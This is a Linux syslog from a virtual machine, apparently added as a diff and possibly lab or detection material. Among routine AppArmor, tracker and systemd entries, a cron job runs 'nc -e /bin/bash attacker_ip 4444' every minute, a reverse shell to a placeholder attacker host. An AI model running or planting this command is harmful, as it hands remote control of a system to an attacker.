+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4203]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4203]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4198]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:05:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4198]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:05:18 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110718.847:186): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:05:23 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110723.944:187): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:05:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110729.150:188): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:05:33 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[4211]: (tracker-extract-3:4211): GLib-GIO-WARNING **: 15:05:33.078: Error creating IO channel for /proc/self/mountinfo: Invalid argument (g-io-error-quark, 13)
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4218]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4219]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4221]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4221]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4218]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:06:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4218]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:06:57 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110817.524:189): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4232]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4233]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4235]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4235]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4232]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:07:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4232]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:07:02 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110822.535:190): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:02 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[4238]: (tracker-extract-3:4238): GLib-GIO-WARNING **: 15:07:02.557: Error creating IO channel for /proc/self/mountinfo: Invalid argument (g-io-error-quark, 13)
+Apr 13 15:07:07 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110827.536:191): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:12 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110832.537:192): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:17 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110837.607:193): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:22 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110842.732:194): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:07:35 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110855.929:195): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4262]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4263]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4265]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4265]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4262]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:08:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4262]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:08:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110909.561:196): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:08:55 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776110935.945:197): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4281]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4282]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4284]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4284]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4281]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:09:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4281]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4288]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting sysstat-collect.service - system activity accounting tool...
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4290]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4292]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4292]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4288]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:10:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4288]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:10:02 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: sysstat-collect.service: Deactivated successfully.
+Apr 13 15:10:02 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished sysstat-collect.service - system activity accounting tool.
+Apr 13 15:11:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4304]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:11:02 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4305]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:11:02 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4307]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:11:02 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4307]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:11:02 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4304]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:11:02 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4304]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[694]: Job `cron.monthly' started
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting systemd-tmpfiles-clean.service - Cleanup of Temporary Directories...
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[694]: Job `cron.monthly' terminated
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[694]: Normal exit (2 jobs run)
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 anacron[4316]: Updated timestamp for job `cron.monthly' to 2026-04-13
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: anacron.service: Deactivated successfully.
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: anacron.service: Consumed 1.554s CPU time, 1.5M memory peak, 0B memory swap peak.
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-tmpfiles[4313]: /usr/lib/tmpfiles.d/snapd.conf:1: Unknown command type '!'.
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-tmpfiles-clean.service: Deactivated successfully.
+Apr 13 15:11:28 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished systemd-tmpfiles-clean.service - Cleanup of Temporary Directories.
+Apr 13 15:11:34 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111094.549:198): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:11:39 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111099.789:199): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:11:44 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111104.790:200): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:11:49 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111109.919:201): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:11:58 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111118.943:202): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4323]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4324]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4326]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4326]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4323]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:12:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4323]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:12:04 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111124.329:203): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:12:40 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[4338]: (tracker-extract-3:4338): GLib-GIO-WARNING **: 15:12:40.505: Error creating IO channel for /proc/self/mountinfo: Invalid argument (g-io-error-quark, 13)
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4344]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4345]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4347]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4347]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4344]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:13:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4344]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4355]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4356]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4358]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4358]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4355]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:14:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4355]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4367]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4369]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4368]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4370]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4367]: pam_unix(cron:session): session closed for user root
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4373]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4373]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4368]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:15:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4368]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4386]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4387]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4389]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4389]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4386]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:16:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4386]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4397]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4399]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4398]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4401]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4397]: pam_unix(cron:session): session closed for user root
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4403]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4403]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4398]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:17:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4398]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4415]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4416]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4418]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4418]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4415]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:18:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4415]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4423]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4424]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4426]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4426]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4423]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:19:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4423]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4431]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting sysstat-collect.service - system activity accounting tool...
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4433]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4435]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4435]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: sysstat-collect.service: Deactivated successfully.
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4431]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished sysstat-collect.service - system activity accounting tool.
+Apr 13 15:20:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4431]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4447]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4448]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4450]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4450]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4447]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:21:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4447]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:21:03 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111663.781:204): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:21:09 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111669.341:205): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:21:38 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111698.849:206): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:21:43 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111703.862:207): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4459]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4462]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4464]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4464]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4459]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:22:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4459]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:22:24 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111744.328:208): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:22:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111749.703:209): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4486]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4487]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[4489]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[4489]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4486]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 15:23:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[4486]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 15:23:19 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111799.314:210): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:23:24 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111804.650:211): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
+Apr 13 15:23:24 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[4497]: (tracker-extract-3:4497): GLib-GIO-WARNING **: 15:23:24.943: Error creating IO channel for /proc/self/mountinfo: Invalid argument (g-io-error-quark, 13)
+Apr 13 15:23:29 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: audit: type=1400 audit(1776111809.651:212): apparmor="DENIED" operation="open" class="file" profile="snap.firefox.firefox" name="/proc/pressure/memory" pid=3027 comm="MemoryPoller" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
